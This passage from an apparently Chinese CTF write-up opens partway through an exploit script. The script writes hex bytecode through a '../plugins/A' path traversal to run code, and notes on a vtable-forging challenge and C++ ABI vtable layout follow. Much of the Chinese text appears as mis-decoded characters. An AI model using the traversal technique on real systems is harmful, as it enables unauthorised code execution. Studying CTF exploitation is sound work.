pychunks:<br>    store(piece, <span class="hljs-string">b&quot;whatever&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span> - <span class="hljs-built_in">len</span>(pychunks)):<br>    store(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x41</span> + i] * <span class="hljs-number">12</span>), <span class="hljs-string">b&quot;whatever&quot;</span>)<br>store(<span class="hljs-string">b&quot;../plugins/A&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(code.decode()))<br>store(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># stop</span><br>store(<span class="hljs-string">b&quot;.//plugins/B&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># filename</span><br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>    store(block, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># data</span><br><span class="hljs-comment"># write ascii bytecode</span><br>dump()<br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/A&quot;</span>)<br><span class="hljs-comment"># win!</span><br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/B&quot;</span>)<br></code></pre></div></td></tr></table></figure><h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p><ul><li></li><li></li></ul><h2 id="placemat"><a href="#placemat" class="headerlink" title="placemat"></a>placemat</h2><ul><li>çœ‹åˆ°ä¸€ä¸ªmeson.buildæ–‡ä»¶, æ‰çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå’ŒcmakeåŒç±»å‹çš„build scripts generation. Wiki<a href="https://en.wikipedia.org/wiki/List_of_build_automation_software">åœ¨æ­¤</a> </li></ul><p>å±…ç„¶æ˜¯32ä½ç¨‹åº, é™¤äº†PIEå…¶ä»–éƒ½å¼€äº†. </p><p>wocä¸ºä»€ä¹ˆåœ¨ubuntuä¸Šè¿è¡Œä¸äº†?? 2.34ç”¨allinoneè£…ä¸Šä¹‹åéƒ½æ²¡æœ‰äº†ç¬¦å·é“¾æ¥, è¿™èƒ½ç”¨???? åœ¨ubuntu2004 22204é‡Œè¿è¡Œéƒ½ç»™æˆ‘è¯´no such file or directory. å·®ä¸å¤šå¾—äº†. </p><p>æä¸å®šè¿™ä¸ªç¯å¢ƒ. ç†è§£ä¸èƒ½, è¿™c++çš„åº“éƒ½æ˜¯ç”¨çš„å•¥? glibcä¸èƒ½ç›´æ¥ç”¨å§. æœç„¶è¿˜æ˜¯æ”¾å¼ƒè¿™ç§æ¯”èµ›é¢˜æ¯”è¾ƒå®é™…, å¤§åŠå¤©å•¥ä¹Ÿæ²¡è¯•å‡ºæ¥. åˆè¢«crazymanå«æ¥çœ‹çœ‹, æˆ‘â€¦è¿˜æ˜¯è¯•è¯•ä»æºç ç¼–è¯‘å§â€¦</p><ul><li>å­¦äº†ä¸¤ä¸‹meson: <code>meson setup [build directory]</code> <code>cd [build directory] &amp;&amp; meson compile</code> <ul><li>æ¯ä¸ªbuild directoryéƒ½æœ‰å„è‡ªçš„é…ç½®, åˆ†æˆä¸€ä¸ªä¸ªæ–‡ä»¶å¤¹ä¾¿äºæµ‹è¯•. </li><li><code>meson compile == ninja</code>, å› ä¸ºmesonçš„é»˜è®¤backendæ˜¯ninja. </li></ul></li><li>å‘ç°ç¼ºå¤±<code>bits/c++config.h</code>, ç„¶åå‡†å¤‡å®‰è£…<code>g++-multilib</code>, ç„¶ååˆå‘ç°kalié‡Œçš„libc6-devç‰ˆæœ¬è¿‡ä½å¯¼è‡´ä¾èµ–çš„libglib2.0-devä¹Ÿè¾ƒä½, ç»“æœæ˜¯libglib2.0-devæ— æ³•å®‰è£…æ›´æ–°ç‰ˆæœ¬. æ‰§è¡Œ<code>pc apt --only-upgrade install libc6-dev</code>åè§£å†³. æœ€ç»ˆæ‰§è¡Œ<br><code>apt install g++-multilib</code>. </li></ul><p>æ€ä¹ˆè°ƒè¯•C++é‡Œé¢çš„ç±»å’Œä¸€äº›å˜é‡å¸ƒå±€æˆ‘è¿˜å¾—ç†Ÿæ‚‰ä¸‹. </p><ul><li>çœ‹äº†çœ‹C++17çš„optional. <a href="https://devblogs.microsoft.com/cppblog/stdoptional-how-when-and-why/">post</a> å°±åƒæ˜¯åˆšåˆšçœ‹çš„rusté‡Œçš„Option&lt;T&gt;. </li><li>é¢è¿˜å¾—çœ‹çœ‹c++ç¼–è¯‘å™¨æ˜¯æ€ä¹ˆå®ç°classçš„. æ‰¾ä¸ª<a href="https://zhuanlan.zhihu.com/p/508050978">æ–‡ç« </a>.  </li></ul><hr><p>å¯èƒ½æœ‰çš„é—®é¢˜:</p><ul><li>Human::requestNameä¸­<code>scanf(&quot;%s&quot;, this-&gt;name);</code>æ²¡æœ‰é™åˆ¶é•¿åº¦. é¬¼çŸ¥é“æº¢å‡ºåˆ°äº†ä»€ä¹ˆåœ°æ–¹. å¥½äº†ç°åœ¨çŸ¥é“äº†.</li><li>è¿˜æœ‰ä¸ªstrcpyæœ‰ä¸ªéå¸¸æ²¡ç”¨çš„æ ˆæº¢å‡º. </li><li>flagçš„è·å–å¿…é¡»æ˜¯èµ¢è¿‡bot. </li></ul><p>ç„¶åé˜Ÿé‡Œåˆ«äººå…ˆåšå‡ºæ¥äº†(ä¸å‡ºæ‰€æ–™), æ˜¯ä¼ªé€ è™šè¡¨ç„¶åè£…æˆbot, è‡ªå·±èµ¢è¿‡è‡ªå·±è·å–flag. æˆ‘å…ˆè°ƒè¯•çœ‹çœ‹c++çš„class<strong>æ€ä¹ˆå¸ƒå±€</strong>çš„. </p><ul><li>é¦–å…ˆç ”ç©¶æ„é€ å‡½æ•°, å‘ç°<code>Human human</code>å£°æ˜è¯­å¥å³æ„é€ å‡½æ•°è°ƒç”¨è¯­å¥, å‚æ•°ä¸ºæ ˆä¸ŠæŒ‡é’ˆ, å¤§å°ä¸ºebp-0x20çš„ä½ç½®, è¿™ä¸ªå°±æ˜¯thisæŒ‡é’ˆ. ç„¶åç»§ç»­è°ƒç”¨çˆ¶ç±»æ„é€ æ¸…ç©ºnameæˆå‘˜, nameæˆå‘˜ç”±thisæ¥å®šä½. ä¸è¿‡nameä¸æ˜¯thisæŒ‡å‘çš„ç©ºé—´, å‰å››å­—èŠ‚æ˜¯ç”¨æ¥æ ‡è¯†å­ç±»çš„ä¸€ä¸²æ•°å­—(ä¹Ÿè®¸æœ‰ä»€ä¹ˆç‰¹æ®Šå«ä¹‰). å¥½å§åŸæ¥æ˜¯è™šè¡¨åœ°å€, <em>å¯¹è±¡çš„è™šè¡¨æŒ‡é’ˆç”¨æ¥æŒ‡å‘è‡ªå·±æ‰€å±ç±»çš„è™šè¡¨ï¼Œè™šè¡¨ä¸­çš„æŒ‡é’ˆä¼šæŒ‡å‘å…¶ç»§æ‰¿çš„<strong>æœ€è¿‘çš„</strong>ä¸€ä¸ªç±»çš„è™šå‡½æ•°</em>. åœ°å€åˆ°IDAé‡Œçœ‹çœ‹æ›´å¤šä¿¡æ¯. </li><li>Playerè¿™ä¸ªåŸºç±»çš„ä¸¤ä¸ªå‡½æ•°åŠ ææ„éƒ½æ˜¯è™šå‡½æ•°, ä½†æ˜¯ææ„æ²¡æœ‰å®šä¹‰, æ‰€ä»¥åœ¨<strong>è™šè¡¨é‡Œé¢æ˜¯NULL</strong>.  </li><li>è¶…å‡ºä½œç”¨åŸŸçš„classç›´æ¥è°ƒç”¨ææ„å‡½æ•°, å¦‚å±€éƒ¨classåœ¨å‡½æ•°æœ«å°¾çš„ææ„. </li><li>æ³¨æ„åˆ°æ–‡ä»¶é‡Œé™¤äº†vtable for Botä¹‹ç±»çš„è¿˜æœ‰</li><li>æœç„¶è¿˜æ˜¯ABIæ ‡å‡†æ›´å…¨é¢ä¸€äº›. <del>çœçš„è‡ªå·±åœ¨è¿™å„¿ä¹±ç ”ç©¶</del>. æ ‡å‡†çœŸçš„å¤ªé•¿äº†. <a href="https://stackoverflow.com/questions/60454989/how-is-type-info-implemented">stackoverflow</a> </li></ul><p>ç»§ç»­ç ”ç©¶:</p><ul><li>åœ¨startSingleplayer()å‡½æ•°æ ˆå¸§é‡Œå­˜å‚¨æœ‰ä¸¤ä¸ªç©å®¶çš„object, ä»¥è™šæŒ‡é’ˆå¼€å¤´æ€»å…±4(vptr)+20(name)=24=0x18å­—èŠ‚, åˆå§‹nameè¢«å¡«æ»¡ç©ºå­—ç¬¦, è¾“å…¥ç©å®¶åç§°æ—¶å¯ä»¥å¡«æ»¡20å­—èŠ‚<del>è¾¾åˆ°leakä¹‹åçš„æ•°æ®çš„ç›®çš„</del>. scanfä¼šåŠ ç©ºå­—ç¬¦, å¿…é¡»ä¿®æ”¹åæ‰èƒ½leak. </li><li>humanæ˜¯æ ˆä¸Šé è¿‘æ ˆåº•çš„å˜é‡, åœ¨[ebp-0x20]çš„ä½ç½®, 0xc(12)å¤„è¿˜æœ‰ä¸ªcanary, æ ˆåº•å…«å­—èŠ‚æ²¡å•¥ç”¨å¤„</li><li><del>takeTurnä¸­åˆæ˜¯%s, è¾“å‡ºé•¿åº¦æ²¡æœ‰é™åˆ¶.</del>  </li></ul><blockquote><p>é‡å¤§å‘ç°, è¿™ä¸ªç¨‹åºæ˜¯32ä½çš„, æ‰€ä»¥è¦ç”¨32ä½åº“. çœŸæ˜¯å¥½ä¸€ä¸ªé‡å¤§å‘ç°, éš¾æ€ªpatchelfå’Œubuntu2204(é»˜è®¤æ²¡æœ‰32ä½è¿è¡Œç¯å¢ƒ)éƒ½ä¸è¡Œ. å¥½çš„ä¸‹äº†debian32ä½2.35libcæˆåŠŸäº†. </p></blockquote><blockquote><p>ç»äº†, è‡ªå·±ç¼–è¯‘çš„åšä¸å‡ºæ¥, ä½†æ˜¯æºæ–‡ä»¶æ˜¯å¯ä»¥çš„, <del>å› ä¸ºä¸¤ä¸ªclassç¦»canaryæœ‰æ›´å¤§çš„è·ç¦»,</del> å› ä¸ºGame classæ”¾åˆ°äº†ä¸¤ä¸ªPlayer classçš„åé¢, è€ŒGameå‰å‡ ä¸ªæˆå‘˜å˜é‡æ˜¯player opponentä¹‹ç±»çš„, å¯ä»¥è§£å†³scanfé»˜è®¤æ·»åŠ çš„ç©ºå­—ç¬¦é—®é¢˜. emmmmè¿™æ ·ç©¶ç«Ÿæ˜¯æ€ä¹ˆå‡ºé¢˜çš„, æ˜¯å·§åˆè¿˜æ˜¯èƒ½æ§åˆ¶å˜é‡åœ¨æ ˆä¸Šçš„ä½ç½®? ä½†æ˜¯æºæ–‡ä»¶è°ƒè¯•æ˜¯çœŸçš„ä¸çˆ½, ä»€ä¹ˆç¬¦å·éƒ½æ²¡æœ‰. éš¾ä¸æˆè¦idaä¿®å¤ç¬¦å·ç„¶åè¿œç¨‹è°ƒè¯•? æƒ³æƒ³éƒ½éº»çƒ¦. è€Œä¸”æœ‰äº›è¾“å…¥ä¸æ˜¯æˆ‘èƒ½æ‰“å‡ºæ¥çš„. è¿˜æ˜¯pwntoolså§. </p></blockquote><blockquote><ul><li><del>æˆ‘æ˜¯ä¸æ˜ç™½ä¸ºä»€ä¹ˆrandom::bitä¼šä¸€ç›´åªé€‰ç¬¬ä¸€ä¸ªç©å®¶, å®Œå…¨æ²¡æœ‰éšæœºæ€§å¯è¨€. ä½†æ˜¯è‡ªå·±ç¼–è¯‘çš„ç¨‹åºå°±å¯ä»¥. (????????)</del> <del>åªæ˜¯æˆ‘è¿æ°”å¥½ç½¢äº†.</del> å±…ç„¶æ˜¯ä¸‹é¢è¿™ä¸ªé—®é¢˜çš„åŸå› . </li><li>ä¸ºä»€ä¹ˆéƒ½å®šä¹‰äº†%20säº†ä½†æ˜¯åœ¨printPlayerNamesè¿˜æ˜¯ä¼šæ‰“å°å‡ºè¶…è¿‡20ä¸ªå­—ç¬¦???????ä»€ä¹ˆé­”æ³•å•Šè¿™æ˜¯.<br>æˆ‘åˆçŸ¥é“äº†, åŸæ¥scanfå’Œprintfä¹Ÿæ˜¯ä¸ä¸€æ ·çš„. <code>printf(&quot;%20s&quot;, buf);</code>é™åˆ¶çš„åªæ˜¯å¯¹é½å®½åº¦, å¦‚æœå­—ç¬¦ä¸²æ›´é•¿å°±ä¼šå¿½ç•¥è¿™ä¸ªå¯¹é½. <code>%20s</code>ç”¨åœ¨scanfé‡Œæ‰æ˜¯é™åˆ¶è¾“å…¥çš„string, ç„¶è€Œåœ¨printfé‡Œå¦‚æœè¦é™åˆ¶è¾“å‡ºé•¿åº¦åˆ™è¦ç”¨<code>%.20s</code>, æˆ–è€…æ˜¯åœ¨å‚æ•°ä¸­æä¾›é•¿åº¦<code>%.*s</code>(è¿˜å¯ä»¥æ˜¯æŸä¸ªä½ç½®çš„å‚æ•°, å…·ä½“è§printfæ‰‹å†Œ)(å·¦å¯¹é½æ˜¯<code>%-20s</code>)</li></ul></blockquote><ul><li>åœ¨congratulateä¸­çœ‹åˆ°<a href="https://en.cppreference.com/w/cpp/language/typeid"><code>typeid</code></a>å®, å¯¹ä¸€ä¸ªå¤šæ€å¯¹è±¡æ±‚ç±»å‹id. å®è´¨ä¸Šæ˜¯???? åªæŸ¥åˆ°æ˜¯æŸ¥ä¸ªè™šè¡¨, å¾…æˆ‘çœ‹çœ‹æ±‡ç¼–. çœ‹åˆ°äº†<a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">c++ abi</a>, ç„¶è€Œå†…å®¹å¤ªå¤šæˆ‘æŠ“ä¸ä½é‡ç‚¹. åˆæ‰¾äº†ä¸€ä¸ªseries <a href="https://shaharmike.com/cpp/vtable-part1/">blog</a>. çœŸçš„å¤ªå¤šäº†, ä½†æˆ‘çœŸçš„æƒ³çœ‹æ‡‚ABI.<br>ä¸å¦‚Stack Overflowé‡Œçš„<a href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class">æ¸…æ¥š</a> è¿˜æ˜¯æœ‰ä¾‹å­çš„å¥½äº›, ä¸€å †æ–‡å­—çœŸçš„å¾ˆéš¾çœ‹æ‡‚. </li></ul><h3 id="c-abi-vtables-amp-RTTI"><a href="#c-abi-vtables-amp-RTTI" class="headerlink" title="c++ abi (vtables &amp; RTTI)"></a>c++ abi (vtables &amp; RTTI)</h3><h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable:"></a>vtable:</h4><ul><li><p>_ZTV is a prefix for vtable, _ZTS is a prefix for type-string (name) and _ZTI is for type-info.</p></li><li><p>é‡è¦çš„æ¦‚å¿µ</p><ul><li><em>primary base class</em>: For a dynamic class, the unique base class (if any) with which it shares the virtual pointer at offset 0.</li><li><em>proper base class</em>: ç»§æ‰¿æ ‘ä¸­ä¸€ä¸ªç±»çš„æ‰€æœ‰çˆ¶ç±»</li><li><em>secondary virtual table</em>: The instance of a virtual table for a base class that is <strong>embedded</strong> in the virtual table of a class derived from it.</li><li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from <strong>a shared virtual table</strong> pointer. </li><li><em>virtual table group</em>: The primary virtual table for a class along with all of the associated secondary virtual tables for its proper base classes.</li></ul></li><li><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-components">vtable components</a> </p><ul><li><em>Virtual Base (vbase) offsets</em> are used to access the virtual bases of an object.</li><li>The <em>offset to top</em> holds the displacement to the top of the object from the location within the object of the virtual table pointer that addresses this virtual table</li><li>The <em>typeinfo pointer</em> points to the typeinfo object used for RTTI </li><li>The virtual table address point <strong>points here</strong> </li><li><em>Virtual function pointers</em>. Each pointer holds either the address of a virtual function of the class, or the address of a secondary entry point that performs certain adjustments before transferring control to a virtual function.</li></ul></li><li><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-construction">vtable construction</a> è¯¦ç»†è®²äº†proper base classåœ¨å„ç§æƒ…å†µä¸‹åº”è¯¥æ€æ ·æ„å»ºvtable. </p><ul><li>æ¯”å¦‚<br><code>No inherited virtual functions</code><br><code>No virtual base classes</code><br><code>Declares virtual functions</code>æ—¶, vtableå°±æ˜¯ç®€å•çš„offset-to-top &amp; RTTI fields &amp; virtual function pointers</li><li>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</li></ul></li><li><p>The elements of the VTT array for a class D:<br>which is declared for each class type that <strong>has indirect or direct virtual base classes</strong>.</p><ul><li><p><strong>Primary virtual pointer</strong></p><p>: address of the primary virtual table for the complete object D.</p></li><li><p><strong>Secondary VTTs</strong></p><p>: for each direct non-virtual proper base class B of D that requires a VTT, in declaration order, a sub-VTT for B-in-D, structured like the main VTT for B, with a primary virtual pointer, secondary VTTs, and secondary virtual pointers, but without virtual VTTs.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>This construction is applied recursively.</em></p></li><li><p><strong>Secondary virtual pointers</strong></p><p>: for each base class X which (a) has virtual bases or is reachable along a virtual path from D, and (b) is not a non-virtual primary base, the address of the virtual table for X-in-D or an appropriate construction virtual table.</p><p>X is reachable along a virtual path from D if there exists a path X, B1, B2, â€¦, BN, D in the inheritance graph such that at least one of X, B1, B2, â€¦, or BN is a virtual base class.</p><p>The order in which the virtual pointers appear in the VTT is inheritance graph preorder.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>There are virtual pointers for direct and indirect base classes. Although primary non-virtual bases do not get secondary virtual pointers, they do not otherwise affect the ordering.</em></p><p><em>Primary virtual bases require a secondary virtual pointer in the VTT because the derived class with which they will share a virtual pointer is determined by the most derived class in the hierarchy.</em></p><p><em>Secondary virtual pointers may be required for base classes that do not require secondary VTTs. A virtual base with no virtual bases of its own does not require a VTT, but does require a virtual pointer entry in the VTT.</em> </p></li><li><p><strong>Virtual VTTs</strong></p><p>: For each proper virtual base classes in inheritance graph preorder, construct a sub-VTT as in (2) above.</p><p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>The virtual VTT addresses come last because they are only passed to the virtual base class constructors for the complete object.</em></p></li></ul></li><li><p>å•ç»§æ‰¿</p><ul><li>å­ç±»è™šè¡¨å¦‚ä¸‹, æ³¨æ„å­ç±»å†…å­˜ä¸­è™šè¡¨æŒ‡é’ˆæŒ‡å‘ä¸‹è¡¨ç¬¬ä¸‰é¡¹. å³è·³è¿‡å‰ä¸¤é¡¹. </li></ul><table><thead><tr><th>Address</th><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>0x400b40</td><td>0x0</td><td><code>top_offset</code> (more on this later)</td></tr><tr><td>0x400b48</td><td>0x400b90</td><td>Pointer to <code>typeinfo for Derived</code> (also part of the above memory dump)</td></tr><tr><td>0x400b50</td><td>0x400a80</td><td>Pointer to <code>Derived::Foo()</code>3. <strong><code>Derived</code>â€™s _vptr points here.</strong></td></tr><tr><td>0x400b58</td><td>0x400a90</td><td>Pointer to <code>Parent::FooNotOverridden()</code> (same as <code>Parent</code>â€™s)</td></tr></tbody></table></li><li><p>å¤šç»§æ‰¿</p><ul><li>å¤šç»§æ‰¿æ—¶æœ€ä¸‹å±‚çš„å­ç±»çš„å†…å­˜ä¸­æœ‰å¤šä¸ªæŒ‡é’ˆ, å¦‚ä¸‹è¡¨æ‰€ç¤º. ä¸ºä»€ä¹ˆå†…å­˜ä¸­è¿˜æœ‰ä¸¤ä¸ªvptr? å› ä¸ºchildå¯èƒ½è¢«è½¬æ¢ä¸º<code>Father*</code>æˆ–è€…<code>Mother*</code>ç±»å‹çš„æŒ‡é’ˆå½“åšå‚æ•°ä¼ é€’, æ­¤æ—¶æ¥æ”¶å‚æ•°çš„å‡½æ•°ä¸éœ€è¦çŸ¥é“childçš„å­˜åœ¨ä¹Ÿèƒ½å¤Ÿè®¿é—®ä¸‹é¢å†…å­˜å¸ƒå±€ä¸­çš„Fatheréƒ¨åˆ†. dataæ˜¾ç„¶åœ¨è¦å…¶ä¸­, è€ŒFatherçš„è™šè¡¨æŒ‡é’ˆè‡ªç„¶ä¹Ÿä¼šåœ¨è¿™é‡Œ, æŒ‡å‘child vtableä»¥æä¾›è™šå‡½æ•°çš„ä¿¡æ¯. </li></ul><table><thead><tr><th>_vptr$Mother</th></tr></thead><tbody><tr><td>mother_data (+ padding)(è¿™æ˜¯ä»€ä¹ˆpadding??)</td></tr><tr><td>_vptr$Father = non-virtual thunk to Child::FatherFoo(void)</td></tr><tr><td>father_data</td></tr><tr><td>child_data1</td></tr></tbody></table><ul><li>å€¼å¾—æ³¨æ„çš„æ˜¯ç°åœ¨child vtableé‡Œå®é™…ä¸Šè£…ä¸‹äº†<strong>ä¸¤ä¸ªtable</strong>. å¦‚ä¸‹vtableçš„ç¬¬äºŒéƒ¨åˆ†. </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `vtable for&#x27;Child<br>  _ZTV5Child       dq 0                    ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D48 dq offset _ZN6Mother9MotherFooEv<br>                                          ; DATA XREF: main+8â†‘o<br>                                          ; Mother::MotherFoo(void)<br>                   dq offset _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>                   dq -8                   ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D68 dq offset _ZThn8_N5Child9FatherFooEv<br>   ; `non-virtual thunk to&#x27;Child::FatherFoo(void)<br></code></pre></div></td></tr></table></figure></li><li><p><strong>ä½†æ˜¯</strong>, å½“å­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶<strong>é‡è½½äº†</strong>çˆ¶ç±»å‡½æ•°, ä¸ºäº†è¦ä½¿ åˆ©ç”¨å¤šæ€å°†<code>child*Â this</code>çš„æŒ‡é’ˆè½¬æ¢ä¸º<code>father*Â this</code>ç„¶å<code>ptr-&gt;FatherFoo()</code>çš„å‡½æ•°èƒ½å¤Ÿæ‰§è¡Œ<strong>child</strong>::FatherFoo(), ç¼–è¯‘å™¨ä¼šè¯†åˆ«åˆ°é‡è½½çš„å­˜åœ¨, å¹¶ç”Ÿæˆä¸Šè¡¨çš„child classç»“æ„, å¹¶ä¸”ç”Ÿæˆä¸€ä¸ªthunkä»£ç ç‰‡æ®µä»£æ›¿Father::Foo()æ¥è°ƒæ•´thisæŒ‡é’ˆä½¿å¾—å…¶å˜æˆchildçš„class ptr. å…¶ä¸­<code>_vptr$Father</code>æŒ‡å‘çš„secondary virtual tableä¸­ä¼šæ˜¯è¿™ä¸ªthunkçš„åœ°å€. </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000555555555227 ; __int64 __fastcall `non-virtual thunk to&#x27;Child::FatherFoo(Child *__hidden this)<br>.text:0000555555555227                 public _ZThn8_N5Child9FatherFooEv<br>.text:0000555555555227 _ZThn8_N5Child9FatherFooEv proc near<br>.text:0000555555555227                 sub     rdi, 8          ; this<br>.text:000055555555522B                 jmp     short _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>.text:000055555555522B _ZThn8_N5Child9FatherFooEv endp<br></code></pre></div></td></tr></table></figure><ul><li>vtableä¸­top_offsetå³ä¸º-8çš„é‚£ä¸€è¡Œ,  çœ‹èµ·æ¥åªæ˜¯æä¾›ä¸€ä¸ªä¿¡æ¯æç¤º, æŒ‡childå†…å­˜ä¸­Fatheréƒ¨åˆ†åˆ°å†…å­˜topçš„è·ç¦».<br>thunkä»£ç ä¸­ç›´æ¥ä½¿ç”¨<code>sub rdi, 8</code>å¹¶æœªå¼•ç”¨è¯¥å¤„æ•°æ®. </li></ul></li><li><p>ä¸‰é‡å¤šç»§æ‰¿, è™šç»§æ‰¿Grandparent class.</p><ul><li>æ–°ä¸œè¥¿: <code>construction vtable for Parent1-in-Child</code> <code>VTT for Child</code> <code>virtual-base offset</code> </li><li><code>virtual-base offset</code>æ˜¯é’ˆå¯¹Child::Child()ä¸­Patent1åˆå§‹åŒ–æ—¶è¦è®¿é—®Grandpatentæ•°æ®æ—¶, thisæŒ‡é’ˆ(æ­¤æ—¶æŒ‡å‘Childå†…å­˜ä¸­Parent1éƒ¨åˆ†, ä¹Ÿå°±æ˜¯Childå¼€å¤´)åˆ°childå†…å­˜ä¸­Grandpatentéƒ¨åˆ†çš„åç§»é‡. </li><li>IDAä¸­<code>construction vtable for Patent1-in-Child</code>å’Œ<code>vtable for Parent</code>åŸºæœ¬é‡å , é™¤äº†å‰è€…å¼€å¤´çš„<code>virtual-base offset</code>åœ¨åè€…ä¸Šæ–¹.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `construction vtable for&#x27; Parent1-in-Child<br>_ZTC5Child0_7Parent1 dq 20h ; that is virtual-base offset<br>; `vtable for&#x27; Parent1<br>...<br></code></pre></div></td></tr></table></figure><ul><li>VTT</li></ul><table><thead><tr><th>Address</th><th>Value</th><th>Symbol</th><th>Meaning</th></tr></thead><tbody><tr><td>0x4009a0</td><td>0x400950</td><td><code>vtable for Child + 24</code></td><td><code>Parent1</code>â€™s entries in <code>Child</code>â€™s vtable</td></tr><tr><td>0x4009a8</td><td>0x4009f8</td><td><code>construction vtable for Parent1-in-Child + 24</code></td><td><code>Parent1</code>â€™s methods in <code>Parent1-in-Child</code></td></tr><tr><td>0x4009b0</td><td>0x400a18</td><td><code>construction vtable for Parent1-in-Child + 56</code></td><td><code>Grandparent&#39;s methods for Parent1-in-Child</code></td></tr><tr><td>0x4009b8</td><td>0x400a98</td><td><code>construction vtable for Parent2-in-Child + 24</code></td><td><code>Parent2&#39;s methods in Parent2-in-Child</code></td></tr><tr><td>0x4009c0</td><td>0x400ab8</td><td><code>construction vtable for Parent2-in-Child + 56</code></td><td>`Grandparentâ€™s methods for Parent2-in-Child</td></tr><tr><td>0x4009c8</td><td>0x400998</td><td><code>vtable for Child + 96</code></td><td>`Grandparentâ€™s entries in Childâ€™s vtable</td></tr><tr><td>0x4009d0</td><td>0x400978</td><td><code>vtable for Child + 64</code></td><td>`Parent2â€™s entries in Childâ€™s vtable</td></tr></tbody></table><p>ä¸ºä»€ä¹ˆä¼šæœ‰VTT? æ¥çœ‹çœ‹childçš„åˆå§‹åŒ–å°±æ˜ç™½äº†:</p><ul><li>é¦–å…ˆGrandparent construction, åˆå§‹åŒ–vtableæŒ‡é’ˆæŒ‡å‘primary vtable. </li><li>ç„¶åParent1åˆå§‹åŒ–Childå†…å­˜ä¸­çš„vtable pträ¸ºVTTä¸­Parent1-in-Childå€¼(ä¹Ÿå°±æ˜¯vtable for Parent1),<br><strong>å†ä¿®æ”¹GrandParent vtableæŒ‡é’ˆæŒ‡å‘å…¶vtableä¸­çš„Grandparentéƒ¨åˆ†</strong>. å…³é”®åœ¨äºParent1å¦‚ä½•çŸ¥é“å…¶å­ç±»Childå†…å­˜ä¸­Grandparentå’Œä»–è‡ªèº«çš„è·ç¦»? æ–¹æ³•å°±æ˜¯ä¼ å…¥äº†VTTåœ°å€, ä¸¤ä¸ªParent1-in-ChildæŒ‡é’ˆæŒ‡ç¤ºäº†å¯¹åº”çš„construction tableå’Œè¯¥tableä¸­çš„vbase offset. <ul><li>å…¶å®è¿™ç§æƒ…å†µä¸‹åªä¼ ä¸€ä¸ªæŒ‡é’ˆä¹Ÿæ˜¯è¶³å¤Ÿçš„, ä½†æ˜¯å½“parentä¹Ÿæœ‰å¤šä¸ªåŸºç±»æ—¶å°±ä¸å¾—ä¸ä½¿ç”¨VTTäº†, å¾ˆæ˜æ˜¾éœ€è¦è®¿é—®å…¶å¤šä¸ªåŸºç±»çš„secondary vtableä¸­çš„vbase offsetæ¥ç¡®å®šå¤šä¸ªåŸºç±»çš„vtableæŒ‡é’ˆå€¼(éƒ½åœ¨Childå†…å­˜ä¸­). </li></ul></li><li>ç„¶åParent2ç»§ç»­åˆå§‹åŒ–å¹¶ä¸”åˆä¿®æ”¹äº†Grandparentçš„vtableæŒ‡é’ˆ. </li><li>å› ä¸ºåŸºç±»çš„æ„é€ ä¸åº”å‡è®¾æ˜¯å…¶å­ç±»è°ƒç”¨çš„æ„é€ å‡½æ•°, æ‰€ä»¥æœ€åChildæŠŠæ‰€æœ‰vtableæŒ‡é’ˆå€¼æ”¹å‘äº†Child vtableä¸­çš„å‡ ä¸ªçˆ¶ç±»éƒ¨åˆ†. </li></ul><p>å¦‚æœæƒ…å†µå˜æˆ</p></li><li><p>â€œin-chargeâ€ and â€œnot-in-chargeâ€ constructor and destructor: stackoverflow<a 